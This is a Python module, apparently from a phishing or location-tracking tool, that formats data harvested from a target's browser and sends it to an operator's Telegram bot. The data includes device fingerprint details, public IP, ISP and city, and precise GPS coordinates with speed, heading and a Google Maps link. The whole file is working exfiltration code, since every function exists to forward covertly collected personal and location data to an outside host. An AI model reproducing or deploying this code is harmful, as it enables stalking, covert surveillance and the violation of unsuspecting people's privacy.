import utils
import requests
from json import dumps, loads

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow


def send_request(token, msg):
    api_url = f'https://api.telegram.org/bot{token[0]}:{token[1]}/sendMessage'
    api_params = {
        'chat_id': token[2],
        'text': msg,
        'parse_mode': 'MarkdownV2'
    }
    rqst = requests.get(api_url, params=api_params, timeout=10)
    if rqst.status_code != 200:
        utils.print(f'{R}[-] {C}Telegram :{W} [{rqst.status_code}] {loads(rqst.text)["description"]}\n')


def tgram_sender(msg_type, content, token):
    json_str = dumps(content)
    json_content = loads(json_str)
    if msg_type == 'device_info':
        info_message = f"""
*Device Information*

```
OS         : {json_content.get('os')}
Platform   : {json_content.get('platform')}
Browser    : {json_content.get('browser')}
GPU Vendor : {json_content.get('vendor')}
GPU        : {json_content.get('render')}
CPU Cores  : {json_content.get('cores')}
RAM        : {json_content.get('ram')}
Public IP  : {json_content.get('ip')}
Resolution : {json_content.get('ht')}x{json_content.get('wd')}
Battery    : {json_content.get('bat', 'N/A')}
Network    : {json_content.get('net', 'N/A')}
Language   : {json_content.get('lang', 'N/A')}
Timezone   : {json_content.get('tz', 'N/A')}
TouchPts   : {json_content.get('touch', 'N/A')}
```"""
        send_request(token, info_message)

    if msg_type == 'ip_info':
        ip_message = f"""
*IP Information*

```
Continent : {json_content['continent']}
Country   : {json_content['country']}
Region    : {json_content['region']}
City      : {json_content['city']}
Org       : {json_content['org']}
ISP       : {json_content['isp']}
```
"""
        send_request(token, ip_message)

    if msg_type == 'location':
        maps_link = f"https://maps.google.com/?q={json_content.get('lat')},{json_content.get('lon')}"
        # We need to escape Maps link for MarkdownV2, so we just append it outside code block
        maps_link_escaped = maps_link.replace('.', '\\.').replace('=', '\\=').replace('?', '\\?').replace('&', '\\&').replace('-', '\\-')
        loc_message = f"""
*Location Information*

```
Latitude  : {json_content.get('lat')}
Longitude : {json_content.get('lon')}
Accuracy  : {json_content.get('acc')}
Altitude  : {json_content.get('alt')}
Direction : {json_content.get('dir')}
Speed     : {json_content.get('spd')}
```
🗺 [Open in Google Maps]({maps_link_escaped})
"""
        send_request(token, loc_message)

    if msg_type == 'url':
        url_msg = json_content['url']
        send_request(token, url_msg)

    if msg_type == 'error':
        error_msg = json_content['error']
        send_request(token, error_msg)
